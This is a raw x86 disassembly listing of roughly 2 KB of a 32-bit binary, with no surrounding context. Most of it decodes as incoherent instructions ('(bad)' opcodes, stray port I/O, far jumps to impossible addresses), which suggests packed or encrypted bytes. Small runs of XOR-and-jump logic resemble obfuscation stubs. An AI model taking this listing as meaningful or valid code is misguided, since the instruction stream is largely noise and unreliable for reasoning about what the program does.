  41300b:	lock scas al,BYTE PTR es:[edi]
  41300d:	and    dh,BYTE PTR [esi-0x14]
  413010:	xor    DWORD PTR [ecx],ebx
  413012:	add    esp,0xffffffd2
  413015:	loopne 0x412fb2
  413017:	sub    al,0x9b
  413019:	pop    fs
  41301b:	push   esi
  41301c:	or     al,BYTE PTR [ebp-0x38]
  41301f:	scas   al,BYTE PTR es:[edi]
  413020:	sbb    eax,0xd7119f6a
  413025:	mov    ebx,0x9f5423e6
  41302a:	(bad)  
  41302b:	jnp    0x412fe0
  41302d:	in     eax,0xac
  41302f:	inc    edx
  413030:	jb     0x413098
  413032:	fld    TBYTE PTR [ebp+ebp*2+0x34fa0e59]
  413039:	add    bl,ah
  41303b:	jmp    0xc9af:0xc9490606
  413042:	xchg   esp,eax
  413043:	hlt    
  413044:	push   ds
  413045:	mov    WORD PTR [edi],cs
  413047:	jmp    0x6642:0x11f12cb6
  41304e:	in     al,dx
  41304f:	pop    esi
  413050:	jnp    0x4130ce
  413052:	xchg   edx,eax
  413053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413054:	fnstenv [eax]
  413056:	call   0xbcbc6f59
  41305b:	adc    BYTE PTR [eax+0x17],0xa0
  41305f:	(bad)  
  413060:	mov    bl,0xdd
  413062:	sbb    al,BYTE PTR [edx+esi*8-0x7cb70020]
  413069:	sub    bl,bl
  41306b:	rol    BYTE PTR [edx-0x64],1
  41306e:	push   edx
  41306f:	and    ecx,DWORD PTR [edx-0x43b1383b]
  413075:	adc    bl,BYTE PTR [eax+0x7b]
  413078:	dec    edx
  413079:	push   esi
  41307a:	sub    bl,BYTE PTR [esi+0x18]
  41307d:	jb     0x413055
  41307f:	call   0xcaeb24f
  413084:	xor    dl,BYTE PTR [ecx-0x26]
  413087:	xchg   esp,eax
  413088:	mov    ebp,0x30916e9a
  41308d:	push   0x26108957
  413092:	aas    
  413093:	and    edi,edx
  413095:	pop    edx
  413096:	call   0x62902de8
  41309b:	pop    esp
  41309c:	adc    BYTE PTR [edx+eax*8-0x6c],dh
  4130a0:	inc    ebp
  4130a1:	dec    eax
  4130a2:	jmp    0x413118
  4130a4:	jbe    0x4130f4
  4130a6:	jecxz  0x41311a
  4130a8:	and    esi,DWORD PTR [ecx+0x8caaafc]
  4130ae:	xchg   edi,eax
  4130af:	fwait
  4130b0:	adc    DWORD PTR [edx+0x6],esi
  4130b3:	dec    esi
  4130b4:	jmp    0x15aabba0
  4130b9:	xchg   ecx,eax
  4130ba:	test   eax,ebx
  4130bc:	jle    0x413085
  4130be:	mov    cl,0x52
  4130c0:	jbe    0x4130f6
  4130c2:	aad    0x8b
  4130c4:	pop    ebx
  4130c5:	ret    0xc120
  4130c8:	in     al,0x5e
  4130ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130cb:	push   edx
  4130cc:	xchg   edx,ecx
  4130ce:	mov    bh,ah
  4130d0:	leave  
  4130d1:	ret    
  4130d2:	sar    DWORD PTR [ebx],0x4f
  4130d5:	xlat   BYTE PTR ds:[ebx]
  4130d6:	jbe    0x4130c3
  4130d8:	sub    BYTE PTR [edi+0x3],0xb3
  4130dc:	in     eax,dx
  4130dd:	pop    ss
  4130de:	mov    esi,0xba1ac319
  4130e3:	(bad)  
  4130e4:	loope  0x413145
  4130e6:	or     ch,BYTE PTR [eax+edx*8+0x3d]
  4130ea:	mov    ebx,esp
  4130ec:	jmp    0xa7718ac4
  4130f1:	dec    esi
  4130f2:	and    BYTE PTR [edi+ebx*8],ch
  4130f5:	mov    esp,0xff349f0b
  4130fa:	inc    ebx
  4130fb:	add    eax,0x294fd047
  413100:	and    ah,ah
  413102:	test   dh,bl
  413104:	mov    WORD PTR [edi+0x60],cs
  413107:	jae    0x413187
  413109:	mov    ah,0xb
  41310b:	jmp    FWORD PTR [ebx+edx*1-0x6b]
  41310f:	cmp    BYTE PTR [ecx-0x23],0x82
  413113:	retf   
  413114:	mov    DWORD PTR ds:0x8fcd8e22,edx
  41311a:	add    esp,DWORD PTR [ebx+0x59a5157e]
  413120:	lahf   
  413121:	loope  0x413167
  413123:	neg    ebp
  413125:	dec    esi
  413126:	jle    0x4131a1
  413128:	push   0xfffffff3
  41312a:	out    dx,al
  41312b:	and    eax,0xe3475c9c
  413130:	pushf  
  413131:	pop    ecx
  413132:	adc    BYTE PTR [ebp-0x1],ch
  413135:	bound  edx,QWORD PTR [edx-0x7aa738ec]
  41313b:	sub    BYTE PTR [ebp+0x68],ah
  41313e:	stos   DWORD PTR es:[edi],eax
  41313f:	ss das 
  413141:	xor    eax,0xfbeca382
  413146:	fistp  QWORD PTR [ecx+ecx*4+0x75]
  41314a:	fmul   DWORD PTR [ecx+0x7589d475]
  413150:	in     al,dx
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fdf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e228,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41317f:	or     BYTE PTR [ecx],dh
  413181:	das    
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x413186
  41318b:	mov    ch,0xe5
  41318d:	xor    BYTE PTR [esp+eiz*4],ch
  413190:	pop    esi
  413191:	cwde   
  413192:	sahf   
  413193:	std    
  413194:	push   si
  413196:	inc    edx
  413197:	xor    al,0x58
  413199:	fimul  WORD PTR [ecx-0x780de4c6]
  41319f:	cmp    al,0xf8
  4131a1:	fld    QWORD PTR [ecx+edx*4-0x5e4701fc]
  4131a8:	dec    ecx
  4131a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131aa:	pusha  
  4131ab:	add    eax,0x457c65ce
  4131b0:	and    ch,BYTE PTR [esi-0x3125b742]
  4131b6:	pop    esp
  4131b7:	dec    BYTE PTR [ebx+0x19d7801e]
  4131bd:	dec    ebx
  4131be:	mov    eax,0x3c1d242f
  4131c3:	adc    al,0xe8
  4131c5:	fadd   DWORD PTR [edx-0x76]
  4131c8:	retf   
  4131c9:	mov    DWORD PTR [ecx],esi
  4131cb:	mov    WORD PTR [eax-0x502fa51c],es
  4131d1:	cwde   
  4131d2:	jbe    0x413253
  4131d4:	div    DWORD PTR [ecx-0x4b]
  4131d7:	enter  0x9570,0x7a
  4131db:	lahf   
  4131dc:	dec    esp
  4131dd:	jmp    0x413168
  4131df:	push   0xd88c5787
  4131e4:	pop    edx
  4131e5:	sub    DWORD PTR [esi+0x4f],0x1
  4131e9:	mov    BYTE PTR [esp+0x10],dl
  4131ed:	cld    
  4131ee:	cmp    eax,0x720f062b
  4131f3:	push   0x7b
  4131f5:	pushf  
  4131f6:	mov    al,ds:0xddd3beaa
  4131fb:	add    dl,BYTE PTR [ebx]
  4131fd:	aad    0x5f
  4131ff:	shl    DWORD PTR [ecx+0x7d],1
  413202:	arpl   cx,ax
  413204:	stos   BYTE PTR es:[edi],al
  413205:	sub    BYTE PTR [eax],al
  413207:	mov    ebp,0xcb64d5d6
  41320c:	or     al,0xe7
  41320e:	pop    esi
  41320f:	sbb    al,0x78
  413211:	(bad)  
  413212:	in     eax,0xb5
  413214:	scas   al,BYTE PTR es:[edi]
  413215:	out    0xed,eax
  413217:	push   0xffffffba
  413219:	scas   eax,DWORD PTR es:[edi]
  41321a:	push   edx
  41321b:	fiadd  DWORD PTR [edi-0x66]
  41321e:	dec    eax
  41321f:	int    0x77
  413221:	and    BYTE PTR [ecx-0x59],bl
  413224:	jns    0x4131f5
  413226:	xchg   BYTE PTR [edi+0x766694e3],ah
  41322c:	push   ss
  41322d:	(bad)  
  41322e:	aas    
  41322f:	mov    dl,BYTE PTR [edx-0x49]
  413232:	dec    ebp
  413233:	sbb    BYTE PTR [edi],0x9
  413236:	mov    ebp,0x1c102bf9
  41323b:	lods   al,BYTE PTR ds:[esi]
  41323c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41323d:	(bad)  
  41323f:	leave  
  413240:	sub    esp,DWORD PTR [ecx-0x2]
  413243:	pop    ds
  413244:	(bad)  
  413245:	test   eax,0x934e5d0e
  41324a:	out    dx,al
  41324b:	in     eax,dx
  41324c:	pop    ebp
  41324d:	mov    bh,0x65
  41324f:	or     cl,0x96
  413252:	(bad)  
  413254:	push   eax
  413255:	xchg   edi,eax
  413256:	ret    
  413257:	sub    ebx,DWORD PTR [esi]
  413259:	fnstsw WORD PTR [ebx+0x4f9d4daa]
  41325f:	inc    ecx
  413260:	mov    esi,0x5d8d29f3
  413265:	sub    eax,0xe4ed6380
  41326a:	or     eax,0x1c368db3
  41326f:	inc    edx
  413270:	outs   dx,BYTE PTR ds:[esi]
  413271:	jbe    0x41327e
  413273:	sti    
  413274:	jge    0x41320f
  413276:	mov    ecx,0x8cced533
  41327b:	ja     0x4b0ed778
  413281:	test   bl,bl
  413283:	cmp    edi,0xd3e426c8
  413289:	fstp   QWORD PTR [ecx]
  41328b:	xlat   BYTE PTR ds:[ebx]
  41328c:	push   esi
  41328d:	mov    dl,0x4e
  41328f:	iret   
  413290:	adc    eax,0xfdfd6447
  413295:	add    bh,BYTE PTR [edi+0x613d998]
  41329b:	push   ss
  41329c:	shl    eax,cl
  41329e:	cmp    ch,BYTE PTR [edx+0x1fea9381]
  4132a4:	fild   QWORD PTR [edx]
  4132a6:	(bad)  
  4132a7:	(bad)  
  4132a9:	jg     0x41322f
  4132ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ac:	mov    fs,ecx
  4132ae:	push   0x18
  4132b0:	dec    esi
  4132b1:	and    ah,BYTE PTR [esi+0xf0c4b3a]
  4132b7:	jnp    0x413312
  4132b9:	daa    
  4132ba:	into   
  4132bb:	neg    DWORD PTR [edx]
  4132bd:	rcl    ebp,1
  4132bf:	loope  0x41328b
  4132c1:	jo     0x413257
  4132c3:	stos   BYTE PTR es:[edi],al
  4132c4:	ins    DWORD PTR es:[edi],dx
  4132c5:	cld    
  4132c6:	inc    eax
  4132c7:	push   0x1a
  4132c9:	sti    
  4132ca:	fs mov ah,0x61
  4132cd:	gs xchg esp,eax
  4132cf:	mov    cl,0x43
  4132d1:	cmp    BYTE PTR [eax+0x4a],al
  4132d4:	jp     0x413306
  4132d6:	and    BYTE PTR ds:0x9b899281,dh
  4132dc:	pop    ss
  4132dd:	mov    esp,0xb24cfef6
  4132e2:	cli    
  4132e3:	sub    edi,DWORD PTR [esi+ecx*4+0x27]
  4132e7:	xchg   edx,eax
  4132e8:	(bad)  
  4132eb:	and    eax,0x683c3c6
  4132f0:	or     eax,0x40793e58
  4132f5:	dec    esi
  4132f6:	jle    0x41333e
  4132f8:	cmp    cl,BYTE PTR [eax-0x3f]
  4132fb:	ror    DWORD PTR [edi],1
  4132fd:	add    DWORD PTR [eax-0x2ece3cd5],ecx
  413303:	(bad)  [ecx-0x64]
  413306:	shl    BYTE PTR [edi],1
  413308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413309:	jge    0x413322
  41330b:	adc    esi,DWORD PTR [esi+esi*1-0x7a013b4b]
  413312:	pop    edi
  413313:	xchg   ebp,eax
  413314:	nop
  413315:	mov    BYTE PTR ds:0x161220b4,bh
  41331b:	cmp    ebx,DWORD PTR [ebp+0x47dba1e1]
  413321:	push   esp
  413322:	sub    ch,BYTE PTR [edx+esi*2]
  413325:	fld    QWORD PTR [esi+0x35]
  413328:	cmp    bl,dh
  41332a:	or     edx,ebp
  41332c:	prefetcht0 BYTE PTR [eax+0x6485d19d]
  413333:	mov    esi,0x46c16f15
  413338:	inc    edi
  413339:	sbb    bl,BYTE PTR [esi+ecx*2]
  41333c:	stc    
  41333d:	out    0xab,al
  41333f:	loopne 0x41334c
  413341:	push   eax
  413342:	retf   
  413343:	sub    al,0x4f
  413345:	xchg   cl,ah
  413347:	xchg   al,cl
  413349:	call   0x74fd2345
  41334e:	inc    DWORD PTR [edi]
  413350:	pop    ss
  413351:	mov    ah,0xf
  413353:	cli    
  413354:	lahf   
  413355:	icebp  
  413356:	xchg   esp,eax
  413357:	outs   dx,BYTE PTR ds:[esi]
  413358:	xor    ah,BYTE PTR [esi-0x50]
  41335b:	repnz icebp 
  41335d:	pop    ds
  41335e:	fstp   QWORD PTR [esi+0x19d04952]
  413364:	pop    edi
  413365:	jne    0x4132f7
  413367:	sub    eax,0x5a3f4689
  41336c:	inc    eax
  41336d:	and    ah,al
  41336f:	inc    ecx
  413370:	pop    ss
  413371:	fild   WORD PTR [edi-0x48]
  413374:	js     0x4133a5
  413376:	adc    BYTE PTR ds:0x7b7e2518,bl
  41337c:	std    
  41337d:	cdq    
  41337e:	sub    esp,DWORD PTR [esi+0x42]
  413381:	cmp    bl,BYTE PTR [ebx-0x4b]
  413384:	mov    ah,0x50
  413386:	adc    bh,BYTE PTR [edx-0x15]
  413389:	add    al,0x69
  41338b:	push   ecx
  41338c:	scas   al,BYTE PTR es:[edi]
  41338d:	xchg   ecx,eax
  41338e:	stos   BYTE PTR es:[edi],al
  41338f:	call   0x31be8866
  413394:	xor    esi,esi
  413396:	xor    BYTE PTR [eax+0x12caa59],dh
  41339c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41339d:	rcl    BYTE PTR [edi-0x33],cl
  4133a0:	out    dx,eax
  4133a1:	push   edi
  4133a2:	jmp    0xcb15:0x923076e9
  4133a9:	xchg   ebp,eax
  4133aa:	sub    al,0x23
  4133ac:	dec    edi
  4133ad:	mov    BYTE PTR ds:0x75903f59,bl
  4133b3:	push   cs
  4133b4:	jge    0x413354
  4133b6:	jmp    0x8012:0x19f64751
  4133bd:	nop
  4133be:	lds    ecx,FWORD PTR gs:[esi+0x44]
  4133c2:	outs   dx,BYTE PTR ds:[esi]
  4133c3:	hlt    
  4133c4:	mov    ebp,0xf88bc474
  4133c9:	or     eax,0x2cc01a7a
  4133ce:	push   0xfffffff4
  4133d0:	aaa    
  4133d1:	adc    bh,BYTE PTR [edi]
  4133d3:	ins    DWORD PTR es:[edi],dx
  4133d4:	or     esi,DWORD PTR [ebp-0x34]
  4133d7:	ret    
  4133d8:	call   0x5463:0x943d4db3
  4133df:	cmp    eax,DWORD PTR es:[ebp-0x7f0a30f8]
  4133e6:	sbb    BYTE PTR [ebx+0xfb989ac],dl
  4133ec:	int    0x5b
  4133ee:	cwde   
  4133ef:	jmp    0x41345a
  4133f1:	sub    DWORD PTR [ecx-0x6b],0xffffffa1
  4133f5:	cmp    DWORD PTR [edi+0x35],esi
  4133f8:	adc    cl,BYTE PTR [ebp+0x131c16b]
  4133fe:	int3   
  4133ff:	sub    bl,al
  413401:	dec    esp
  413402:	es sbb cl,al
  413405:	retf   
  413406:	jecxz  0x413398
  413408:	popa   
  413409:	mov    dh,0x38
  41340b:	daa    
  41340c:	adc    DWORD PTR [ecx+0x3c],esp
  41340f:	sub    edi,DWORD PTR [esp+eiz*2-0x5c0beddf]
  413416:	fisubr DWORD PTR [ebx-0x6f]
  413419:	pop    esp
  41341a:	(bad)  
  41341b:	cld    
  41341c:	lea    esi,[edx]
  41341e:	jne    0x4133b4
  413420:	icebp  
  413421:	pop    esp
  413422:	neg    BYTE PTR [ebx]
  413424:	rcr    DWORD PTR [edi-0x7d],0xf4
  413428:	pop    edx
  413429:	inc    esi
  41342a:	push   es
  41342b:	ss push 0x14228dd0
  413431:	pop    es
  413432:	pushf  
  413433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413434:	les    esi,FWORD PTR [ecx]
  413436:	das    
  413437:	pop    ecx
  413438:	(bad)  
  413439:	sub    edx,DWORD PTR [ebx+0x33d32902]
  41343f:	mov    ebx,0x36a026e5
  413444:	loopne 0x413420
  413446:	mov    edi,0x7edb43a2
  41344b:	in     al,0xeb
  41344d:	(bad)  
  41344e:	es leave 
  413450:	lahf   
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fdf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fdd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xc6dbe20f,al
  413492:	jb     0x413480
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x2d70707e
  41349c:	jecxz  0x4134ca
  41349e:	inc    edi
  41349f:	jae    0x4134ea
  4134a1:	inc    edx
  4134a2:	mov    ch,0x7c
  4134a4:	jae    0x4134be
  4134a6:	push   ebp
  4134a7:	mov    ebx,0x4c3078f8
  4134ac:	mov    WORD PTR [edi-0x6a],?
  4134af:	jno    0x413507
  4134b1:	xchg   ebx,eax
  4134b2:	fdiv   DWORD PTR [eax-0x359c5e38]
  4134b8:	loopne 0x4134bd
  4134ba:	add    al,0x44
  4134bc:	mov    ds:0xd48784dd,al
  4134c1:	mov    ecx,0xf2786c2c
  4134c6:	retf   0x78d
  4134c9:	cs xor al,0xcd
  4134cc:	xor    DWORD PTR [ecx],esp
  4134ce:	retf   
  4134cf:	test   eax,0x6287f95
  4134d4:	lods   eax,DWORD PTR ds:[esi]
  4134d5:	mov    ah,BYTE PTR [eax]
  4134d7:	or     DWORD PTR [ebp+0x20],eax
  4134da:	mov    ch,BYTE PTR ds:0x6af3d72e
  4134e0:	or     al,0x39
  4134e2:	or     esi,DWORD PTR [ebx+0x25]
  4134e5:	mov    ds:0xbdbd5a27,al
  4134ea:	rol    BYTE PTR [edi+ecx*2+0x715feef4],cl
  4134f1:	add    eax,0x2e6d710f
  4134f6:	and    BYTE PTR [ebx-0x62b99bb8],ah
  4134fc:	es jg  0x413568
  4134ff:	sti    
  413500:	out    0x10,eax
  413502:	cmc    
  413503:	lods   al,BYTE PTR ds:[esi]
  413504:	in     al,dx
  413505:	xor    bl,BYTE PTR [edx+0x4d]
  413508:	lods   al,BYTE PTR ds:[esi]
  413509:	pushf  
  41350a:	inc    esi
  41350b:	lds    ebx,FWORD PTR [ebp+eiz*2-0x2eab6143]
  413512:	xchg   esp,eax
  413513:	imul   esi,DWORD PTR [ecx],0x25
  413516:	inc    eax
  413517:	out    0xe5,al
  413519:	rcl    ebx,0xf2
  41351c:	mov    ebx,0xf3b7094e
  413521:	or     eax,0xc507bb16
  413526:	int3   
  413527:	in     eax,dx
  413528:	mov    dh,0x27
  41352a:	pop    esp
  41352b:	ja     0x4134e2
  41352d:	and    BYTE PTR [edx-0x6a],0x35
  413531:	pop    ebp
  413532:	aas    
  413533:	xor    BYTE PTR [edi-0x76],cl
  413536:	push   esi
  413537:	in     eax,0xfa
  413539:	femms  
  41353b:	xchg   ebx,eax
  41353c:	imul   edi,DWORD PTR [ebp-0x40],0xffffffc5
  413540:	sub    DWORD PTR [eax-0x6bea5485],ebp
  413546:	out    dx,al
  413547:	jecxz  0x4135a6
  413549:	das    
  41354a:	in     al,dx
  41354b:	repz pop ebx
  41354d:	aaa    
  41354e:	test   BYTE PTR [ebx-0x7effcff0],cl
  413554:	lea    edx,[edx-0x3ee53c2c]
  41355a:	das    
  41355b:	pushf  
  41355c:	loope  0x41355d
  41355e:	mov    fs,WORD PTR [edx-0x66a1541a]
  413564:	out    0x10,al
  413566:	sub    ecx,DWORD PTR cs:[esi+0x10]
  41356a:	(bad)  
  41356b:	add    ecx,ebp
  41356d:	adc    bl,BYTE PTR [ebx+0x38]
  413570:	les    ebp,FWORD PTR [ecx+ecx*1-0x68c1e2ff]
  413577:	cmc    
  413578:	aam    0xbc
  41357a:	add    eax,0xb6e7a34c
  41357f:	ins    DWORD PTR es:[edi],dx
  413580:	sub    eax,0x9a4cf52b
  413585:	sti    
  413586:	(bad)  
  413588:	pop    esi
  413589:	pop    ss
  41358a:	stc    
  41358b:	pop    esi
  41358c:	aam    0xb5
  41358e:	mov    ebp,0x6fd56f38
  413593:	push   edi
  413594:	ret    
  413595:	or     DWORD PTR [ebx],ebp
  413597:	in     al,0xe2
  413599:	int3   
  41359a:	in     al,0x1b
  41359c:	push   esp
  41359d:	out    dx,al
  41359e:	mov    bh,0x65
  4135a0:	in     eax,dx
  4135a1:	cmp    ebx,DWORD PTR [eax+0x43]
  4135a4:	popa   
  4135a5:	ret    0x4722
  4135a8:	popf   
  4135a9:	adc    BYTE PTR [esi+ebp*8+0x1b],ah
  4135ad:	cmovl  ecx,DWORD PTR [edi+0xff283a3]
  4135b4:	or     al,0xd9
  4135b6:	xor    bh,BYTE PTR [edi-0x4cfe7f41]
  4135bc:	xor    eax,0xad989fc0
  4135c1:	imul   eax,DWORD PTR ds:[ecx+0x43],0xffffff88
  4135c6:	leave  
  4135c7:	mov    ds:0x349913f3,al
  4135cc:	push   0x3a67f42b
  4135d1:	bound  esp,QWORD PTR [ecx+0xe]
  4135d4:	xchg   edi,eax
  4135d5:	aaa    
  4135d6:	out    0x8e,eax
  4135d8:	into   
  4135d9:	inc    ecx
  4135da:	xchg   edi,eax
  4135db:	bound  edx,QWORD PTR [ecx-0x2cbfeb5c]
  4135e1:	lods   al,BYTE PTR ds:[esi]
  4135e2:	ret    0x1868
  4135e5:	or     dl,ah
  4135e7:	jnp    0x413625
  4135e9:	call   FWORD PTR [edx]
  4135eb:	lock pushf 
  4135ed:	arpl   si,dx
  4135ef:	mov    eax,ds:0x128daf0e
  4135f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135f5:	mov    ds:0x490e7977,eax
  4135fa:	test   BYTE PTR [ebx+0x4185b299],ah
  413600:	(bad)  
  413601:	cmp    eax,0x19c607b8
  413606:	sbb    ah,BYTE PTR [ecx+0x5f]
  413609:	outs   dx,DWORD PTR ds:[esi]
  41360a:	(bad)  [ebx+0x10]
  41360d:	test   al,0x0
  41360f:	mov    eax,ds:0xedf2f12e
  413614:	inc    esp
  413615:	push   ecx
  413616:	jmp    0xc192b4af
  41361b:	or     bx,WORD PTR [eax]
  41361e:	inc    esi
  41361f:	icebp  
  413620:	inc    eax
  413621:	and    edi,DWORD PTR [eax-0x61]
  413624:	out    0x8c,al
  413626:	ds jmp 0x5655db31
  41362c:	jo     0x41368a
  41362e:	mov    edx,ds
  413630:	mov    cl,0xfc
  413632:	(bad)  
  413633:	fsub   st(2),st
  413635:	mov    ebx,0x18db83c1
  41363a:	dec    edx
  41363b:	jmp    0x85e9e9dd
  413640:	push   0x18
  413642:	icebp  
  413643:	test   al,dl
  413645:	mov    ah,0x71
  413647:	popf   
  413648:	push   ebp
  413649:	mov    ebp,0xea94ed73
  41364e:	bound  esp,QWORD PTR [ecx]
  413650:	imul   esi,DWORD PTR [ebx+eax*2],0x5d
  413654:	pusha  
  413655:	retf   0xb910
  413658:	int    0xb5
  41365a:	mov    al,dl
  41365c:	xor    eax,0x48745ec3
  413661:	loopne 0x413667
  413663:	sub    eax,0x1b7d00a9
  413668:	cmp    dh,ah
  41366a:	cli    
  41366b:	inc    ebx
  41366c:	fwait
  41366d:	popw   es
  41366f:	clc    
  413670:	prefetch BYTE PTR [eax+0x2f]
  413674:	fs mov dh,0xf2
  413677:	pop    es
  413678:	out    0x87,al
  41367a:	jge    0x4136a7
  41367c:	jb     0x4136e9
  41367e:	adc    edx,0xc546a304
  413684:	xchg   edx,eax
  413685:	cs jle 0x4136f2
  413688:	lods   al,BYTE PTR ds:[esi]
  413689:	pop    ebp
  41368a:	cwd    
  41368c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41368d:	mov    bl,0x16
  41368f:	fwait
  413690:	arpl   ax,cx
  413692:	idiv   ebp
  413694:	mov    WORD PTR [edi+0x2],cs
  413697:	mov    bl,0x8a
  413699:	sub    BYTE PTR [edi],ah
  41369b:	cld    
  41369c:	loop   0x413656
  41369e:	dec    edi
  41369f:	sub    esp,ebx
  4136a1:	clc    
  4136a2:	mov    al,ds:0x7c5a9af1
  4136a7:	dec    edx
  4136a8:	and    ebp,esi
  4136aa:	dec    esi
  4136ab:	inc    edi
  4136ac:	nop
  4136ad:	inc    edx
  4136ae:	in     eax,dx
  4136af:	icebp  
  4136b0:	mov    dh,0x2e
  4136b2:	test   al,0x4a
  4136b4:	mov    WORD PTR [edi-0x69f5c257],cs
  4136ba:	sub    eax,0x4aa51527
  4136bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136c0:	pop    ds
  4136c1:	xchg   ebx,eax
  4136c2:	aam    0x9f
  4136c4:	fld    TBYTE PTR [esi-0x11]
  4136c7:	fmulp  st(1),st
  4136c9:	(bad)  
  4136ca:	cdq    
  4136cb:	addr16 ror bh,1
  4136ce:	pop    es
  4136cf:	cmp    DWORD PTR [eax-0x337c4e57],0xd4407dbb
  4136d9:	pop    ebp
  4136da:	push   esp
  4136db:	(bad)  
  4136dc:	in     al,dx
  4136dd:	and    al,0x43
  4136df:	fst    st(2)
  4136e1:	and    BYTE PTR [edx-0x4e],al
  4136e4:	fwait
  4136e5:	jp     0x41372b
  4136e7:	shl    BYTE PTR [edi+0x34],0x89
  4136eb:	cmp    BYTE PTR [edi+0x28],ah
  4136ee:	inc    edx
  4136ef:	ins    BYTE PTR es:[edi],dx
  4136f0:	das    
  4136f1:	mov    bl,0x1a
  4136f3:	sbb    edi,ecx
  4136f5:	test   BYTE PTR [edx+0x654cf549],cl
  4136fb:	mov    edx,0x77b8211a
  413700:	pop    es
  413701:	fcomp  DWORD PTR [esi]
  413703:	nop
  413704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413705:	sahf   
  413706:	and    eax,0xc6a5a564
  41370b:	jb     0x413705
  41370d:	fcmovnu st,st(1)
  41370f:	push   edi
  413710:	lds    ecx,FWORD PTR [esi-0x57]
  413713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413714:	loopne 0x4136bb
  413716:	mov    eax,ds:0x33b6364
  41371b:	pop    edi
  41371c:	hlt    
  41371d:	fild   DWORD PTR [ebp+0x340df5e0]
  413723:	imul   ebp,DWORD PTR [edi],0x8ea32703
  413729:	mov    bh,0x50
  41372b:	jno    0x413792
  41372d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41372e:	jmp    0x7084:0x51ab67ee
  413735:	or     edi,0x4d
  413738:	mov    edx,0xd0a3297e
  41373d:	mul    DWORD PTR ds:0x662065de
  413743:	test   eax,0x7f02ddb1
  413748:	in     al,dx
  413749:	lahf   
  41374a:	inc    ebx
  41374b:	int3   
  41374c:	jp     0x413778
  41374e:	mov    ecx,0xc02cd8af
  413753:	nop
  413754:	bound  ecx,QWORD PTR [edi-0x7fb2d76c]
  41375a:	push   esp
  41375b:	(bad)  
  41375c:	cmp    eax,0xc62c1ba4
  413761:	fidivr DWORD PTR [ebx]
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41377f:	nop
  413780:	push   edi
  413781:	sub    BYTE PTR ds:0xb970706b,dh
  413787:	jle    0x4137f9
  413789:	jo     0x4137e4
  41378b:	in     eax,dx
  41378c:	fs pop esp
  41378e:	adc    dh,ch
  413790:	dec    ebp
  413791:	out    dx,al
  413792:	inc    ecx
  413793:	xor    al,BYTE PTR [edi+ecx*4-0x4d]
  413797:	fbld   TBYTE PTR [edi+eax*4-0x61]
  41379b:	sub    al,0x35
  41379d:	aas    
  41379e:	ret    
  41379f:	inc    esi
  4137a0:	adc    edx,ebp
  4137a2:	rol    BYTE PTR [ebp-0x13],cl
  4137a5:	jl     0x4137ff
  4137a7:	jae    0x4137ed
  4137a9:	mov    eax,0x23d27a77
  4137ae:	shr    DWORD PTR [edi+0x188096d3],1
  4137b4:	xchg   edi,eax
  4137b5:	in     eax,dx
  4137b6:	out    dx,eax
  4137b7:	sbb    BYTE PTR [esp+esi*4+0x1f],bl
  4137bb:	std    
  4137bc:	fild   DWORD PTR [eax-0x70]
  4137bf:	mov    dl,0x43
  4137c1:	test   edx,ebp
  4137c3:	pmuludq mm2,mm2
  4137c6:	js     0x4137b3
  4137c8:	ins    BYTE PTR es:[edi],dx
  4137c9:	hlt    
  4137ca:	sbb    DWORD PTR [edi+esi*1-0x61],eax
  4137ce:	popa   
  4137cf:	mov    ds:0xd45786b,eax
  4137d4:	mov    bh,0x73
  4137d6:	and    BYTE PTR [ecx+0x2aee4516],0xda
  4137dd:	out    dx,eax
  4137de:	xor    dl,dl
  4137e0:	cmp    cl,al
  4137e2:	add    ah,BYTE PTR [esi]
  4137e4:	pop    esi
  4137e5:	stos   BYTE PTR es:[edi],al
  4137e6:	and    edi,DWORD PTR [edi+edx*2]
  4137e9:	push   ebp
  4137ea:	or     al,0xcd
  4137ec:	adc    DWORD PTR [ebp-0x61],ecx
  4137ef:	ret    
  4137f0:	jnp    0x41386d
  4137f2:	inc    esi
  4137f3:	bound  edx,QWORD PTR [edi+ecx*2]
  4137f6:	sub    al,0x5f
